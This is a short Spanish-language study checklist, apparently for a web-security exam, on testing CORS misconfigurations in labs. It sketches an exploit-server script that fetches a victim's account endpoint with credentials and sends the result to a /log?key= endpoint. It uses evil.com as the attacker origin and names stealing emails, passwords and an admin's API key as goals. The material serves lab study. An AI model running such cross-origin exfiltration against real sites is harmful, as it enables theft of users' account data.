---
aliases:
  - to-do CORS
tags:
  - exam/to-do
  - vuln/cors
---

# CORS — Qué probar

> Técnica → [[vulnerabilities/005-cors/cors|entry point]] · labs → [[vulnerabilities/005-cors/labs/README|labs]]

## 🚩 Flags

> [!danger] 🚩 ¿Está? (las 2 juntas, en la respuesta del endpoint de datos)
> 1. **`Access-Control-Allow-Origin` refleja tu `Origin`** arbitrario (probá `Origin: https://evil.com` en Repeater) — o acepta **`Origin: null`** — o **confía en subdominios**.
> 2. **`Access-Control-Allow-Credentials: true`**.

> [!warning] ⚠️ `ACAO: *` NO sirve
> El `*` no convive con credenciales → solo data pública. Buscás **reflejo** / **`null`** / **subdominio confiable**.

## 🎯 Por stage

| Aspecto | 🟢 Stage 1 | 🔴 Stage 2 |
| --- | --- | --- |
| **A quién** | una víctima | el **admin** |
| **Objetivo** | exfiltrar `email`/`apiKey`/`password` | leer `/my-account` del admin → su `apiKey` → escalar |

## ♾️ Independiente del stage
- [ ] En Repeater, a la request de datos (`/accountDetails`, `/my-account`, `/api/...`) agregá `Origin: https://evil.com` → ¿reflejo? ¿`Allow-Credentials: true`?
- [ ] **Entrega:** exploit server con `<script>` que hace `fetch(endpoint,{credentials:'include'})` → `location='/log?key='+…` → **Deliver to victim** → leer **Access log**.
- [ ] Si confía en **subdominios/HTTP** → trampolín = **XSS en un subdominio**.

## 🔗 Referencias
- [[vulnerabilities/005-cors/cors|entry point]] · [[vulnerabilities/005-cors/labs/README|labs]]
